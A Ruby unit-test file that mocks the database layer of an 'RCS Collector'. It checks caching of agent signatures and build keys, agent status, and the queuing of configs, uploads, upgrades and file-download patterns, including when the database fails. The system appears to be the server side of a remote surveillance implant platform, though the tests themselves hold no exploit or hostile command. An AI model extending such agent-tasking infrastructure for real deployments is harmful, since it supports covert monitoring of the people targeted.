require 'helper'
require 'singleton'

module RCS
module Collector

# dirty hack to fake the trace function
# re-open the class and override the method
class DB
  def trace(a, b)
  end
end

# mockup for the config singleton
class Config
  include Singleton
  def initialize
    @global = {'DB_ADDRESS' => 'test',
               'DB_PORT' => 80,
               'DB_SIGN' => 'rcs-server.sig',
               'DB_CERT' => 'rcs.pem'}
  end
end

# fake classes used during the DB initialize
class DB_rest
  def trace(a, b)
  end
end

# this class is a mockup for the db layer
# it will implement fake response to test the DB class
class DB_mockup_rest
  def initialize
    @@failure = false
  end

  # used the change the behavior of the mockup methods
  def self.failure=(value)
    @@failure = value
  end

  # mockup methods
  def login(user, pass); return (@@failure) ? false : true; end
  def logout; end
  def agent_signature
    raise if @@failure
    return "test-agent-signature"
  end
  def network_signature
    raise if @@failure
    return "test-network-signature"
  end
  def check_signature
    raise if @@failure
    return "test-check-signature"
  end
  def factory_keys
    raise if @@failure
    return {'BUILD001' => 'secret class key', 'BUILD002' => "another secret"}
  end
  def agent_status(build_id, instance_id, platform, demo, scout)
    return {status: DB::UNKNOWN_AGENT, id: 0, good: false} if @@failure
    # return status, bid, good
    return {status: DB::ACTIVE_AGENT, id: 1, good: true}
  end
  def new_conf?(bid)
    raise if @@failure
    return true
  end
  def new_conf(bid)
    raise if @@failure
    return "this is the binary config"
  end
  def new_uploads(bid)
    raise if @@failure
    return { 1 => {:filename => 'filename1', :content => "file content 1"},
             2 => {:filename => 'filename2', :content => "file content 2"}}
  end
  def new_upgrades(bid)
    raise if @@failure
    return { 1 => {:filename => 'upgrade1', :content => "upgrade content 1"},
             2 => {:filename => 'upgrade2', :content => "upgrade content 2"}}
  end
  def new_downloads(bid)
    raise if @@failure
    return { 1 => 'pattern'}
  end
  def new_filesystems(bid)
    raise if @@failure
    return { 1 => {:depth => 1, :path => 'pattern'}}
  end
end

class TestDB < Test::Unit::TestCase

  def setup
    # take the internal variable representing the db layer to be used
    # and mock it for the tests
    DB.instance.instance_variable_set(:@db_rest, DB_mockup_rest.new)
    # clear the cache
    DBCache.destroy!
    # every test begins with the db connected
    DB_mockup_rest.failure = false
    DB.instance.connect!
    assert_true DB.instance.connected?
  end

  def teardown
    DBCache.destroy!
  end

  def test_connect
    DB_mockup_rest.failure = true
    DB.instance.connect!
    assert_false DB.instance.connected?
  end

  def test_disconnect
    DB.instance.disconnect!
    assert_false DB.instance.connected?
  end

  def test_cache_init
    assert_true DB.instance.cache_init
    assert_equal Digest::MD5.digest('test-agent-signature'), DB.instance.agent_signature
    assert_equal 'test-network-signature', DB.instance.network_signature
    assert_equal Digest::MD5.digest('secret class key'), DB.instance.factory_key_of('BUILD001')

    DB_mockup_rest.failure = true
    # this will fail to reach the db 
    assert_false DB.instance.cache_init
    assert_false DB.instance.connected?
    assert_equal Digest::MD5.digest('test-agent-signature'), DB.instance.agent_signature
    assert_equal 'test-network-signature', DB.instance.network_signature
    assert_equal Digest::MD5.digest('secret class key'), DB.instance.factory_key_of('BUILD001')

    # now the error was reported to the DB layer, so it should init correctly
    assert_true DB.instance.cache_init
    assert_equal Digest::MD5.digest('test-agent-signature'), DB.instance.agent_signature
    assert_equal 'test-network-signature', DB.instance.network_signature
    assert_equal Digest::MD5.digest('secret class key'), DB.instance.factory_key_of('BUILD001')
  end

  def test_factory_key
    # this is taken from the mockup
    assert_equal Digest::MD5.digest('secret class key'), DB.instance.factory_key_of('BUILD001')
    # not existing build from mockup
    assert_equal nil, DB.instance.factory_key_of('404')

    DB_mockup_rest.failure = true
    # we have it in the cache
    assert_equal Digest::MD5.digest('secret class key'), DB.instance.factory_key_of('BUILD001')
    assert_false DB.instance.connected?
    # not existing build in the cache and the db is failing
    assert_equal nil, DB.instance.factory_key_of('404')
  end

  def test_agent_status
    assert_equal [DB::ACTIVE_AGENT, 1, true], DB.instance.agent_status('BUILD001', 'inst', 'type', false, false)
    # during the db failure, we must be able to continue
    DB_mockup_rest.failure = true
    assert_equal [DB::UNKNOWN_AGENT, 0, false], DB.instance.agent_status('BUILD001', 'inst', 'type', false, false)
  end

  def test_new_conf
    assert_true DB.instance.new_conf?(1)
    assert_equal "this is the binary config", DB.instance.new_conf(1)

    DB_mockup_rest.failure = true
    assert_false DB.instance.new_conf?(1)
    assert_false DB.instance.connected?
    assert_equal nil, DB.instance.new_conf(1)
  end

  def test_new_uploads
    assert_true DB.instance.new_uploads?(1)
    upl, left = DB.instance.new_uploads(1)
    # we have two fake uploads
    assert_equal 1, left
    assert_equal "filename1", upl[:filename]
    assert_equal "file content 1", upl[:content]
    # get the second one
    upl, left = DB.instance.new_uploads(1)
    assert_equal 0, left
    assert_equal "filename2", upl[:filename]
    assert_equal "file content 2", upl[:content]

    DB_mockup_rest.failure = true
    assert_false DB.instance.new_uploads?(1)
    assert_false DB.instance.connected?
    upl, left = DB.instance.new_uploads(1)
    assert_equal nil, upl
  end

  def test_new_upgrade
    assert_true DB.instance.new_upgrade?(1)
    upg, left = DB.instance.new_upgrade(1, '')
    # we have two fake uploads
    assert_equal 1, left
    assert_equal "upgrade1", upg[:filename]
    assert_equal "upgrade content 1", upg[:content]
    # get the second one
    upg, left = DB.instance.new_upgrade(1, '')
    assert_equal 0, left
    assert_equal "upgrade2", upg[:filename]
    assert_equal "upgrade content 2", upg[:content]

    DB_mockup_rest.failure = true
    assert_false DB.instance.new_upgrade?(1)
    assert_false DB.instance.connected?
    upg, left = DB.instance.new_upgrade(1, '')
    assert_equal nil, upg
  end

  def test_new_downloads
    assert_true DB.instance.new_downloads?(1)
    assert_equal ["pattern"], DB.instance.new_downloads(1)

    DB_mockup_rest.failure = true
    assert_false DB.instance.new_downloads?(1)
    assert_false DB.instance.connected?
    assert_equal [], DB.instance.new_downloads(1)
  end

  def test_new_filesystems
    assert_true DB.instance.new_filesystems?(1)
    assert_equal [{:depth => 1, :path => "pattern"}], DB.instance.new_filesystems(1)

    DB_mockup_rest.failure = true
    assert_false DB.instance.new_filesystems?(1)
    assert_false DB.instance.connected?
    assert_equal [], DB.instance.new_filesystems(1)
  end

end
    
end #Collector::
end #RCS::
